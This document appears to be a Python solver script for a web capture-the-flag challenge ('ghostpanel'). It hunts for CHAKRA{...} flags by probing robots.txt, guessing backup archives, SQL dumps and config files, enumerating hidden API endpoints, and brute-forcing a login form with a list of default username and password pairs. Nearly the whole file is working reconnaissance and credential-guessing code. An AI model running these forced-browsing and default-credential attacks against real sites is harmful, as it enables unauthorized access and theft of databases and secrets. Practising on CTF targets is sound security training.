#!/usr/bin/env python3
import requests, re, json

base = 'https://ghostpanel-ctf.onrender.com'
s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0'

def get(path, **kw):
    r = s.get(base + path, timeout=15, **kw)
    flag = re.findall(r'CHAKRA\{[^}]+\}', r.text)
    print(f'{r.status_code} {path} ({len(r.content)}b){" *** FLAG: " + str(flag) + " ***" if flag else ""}')
    if flag:
        print(f'FLAG: {flag}')
    if r.status_code == 200 and len(r.content) < 3000:
        print(f'  >> {r.text[:500]}')
    return r

def post(path, data=None, json_data=None, **kw):
    r = s.post(base + path, data=data, json=json_data, timeout=15, **kw)
    flag = re.findall(r'CHAKRA\{[^}]+\}', r.text)
    print(f'POST {r.status_code} {path} ({len(r.content)}b){" *** FLAG: " + str(flag) + " ***" if flag else ""}')
    if flag:
        print(f'FLAG: {flag}')
    if len(r.content) < 2000:
        print(f'  >> {r.text[:500]}')
    return r

print('=== DISCOVERED PATHS ===')
get('/robots.txt')
get('/backup/')
get('/hidden-api')
get('/hidden-api/')

print('\n=== BACKUP DIRECTORY ===')
for f in ['backup.zip', 'backup.tar.gz', 'backup.sql', 'db.sql', 'data.sql',
          'source.zip', 'code.zip', 'app.zip', 'ghost.zip', 'panel.zip',
          'config.json', 'config.php', 'config.py', 'settings.py', 'app.py',
          'database.sql', 'users.sql', 'dump.sql']:
    get(f'/backup/{f}')

print('\n=== HIDDEN API ===')
for path in ['/hidden-api/flag', '/hidden-api/users', '/hidden-api/admin',
             '/hidden-api/secret', '/hidden-api/config', '/hidden-api/debug',
             '/hidden-api/v1', '/hidden-api/status', '/hidden-api/keys',
             '/hidden-api/token', '/hidden-api/data']:
    get(path)

print('\n=== LOGIN ATTEMPT ===')
# Try default creds
for user, pwd in [('admin', 'admin'), ('admin', 'password'), ('admin', 'ghost'),
                  ('admin', 'ghostpanel'), ('ghost', 'ghost'), ('root', 'root'),
                  ('admin', '123456'), ('kalash', 'kalash'), ('kalash', 'admin')]:
    r = post('/login', json_data={'username': user, 'password': pwd})
    if 'token' in r.text.lower() or 'success' in r.text.lower() or 'dashboard' in r.text.lower():
        print(f'[+] LOGIN SUCCESS: {user}/{pwd}')
        break

print('\n=== ADMIN PAGE ===')
get('/admin')
get('/admin/')
